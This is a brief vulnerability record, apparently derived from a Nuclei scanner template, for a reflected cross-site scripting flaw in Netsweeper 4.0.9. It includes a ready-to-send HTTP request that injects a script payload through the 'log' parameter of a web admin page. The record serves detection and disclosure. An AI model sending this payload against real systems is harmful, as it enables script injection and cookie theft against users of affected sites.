# Vulnerability: Netsweeper 4.0.9 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`netsweeper-rxss.yaml`)

## Description
Netsweeper 4.0.9 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter=
```

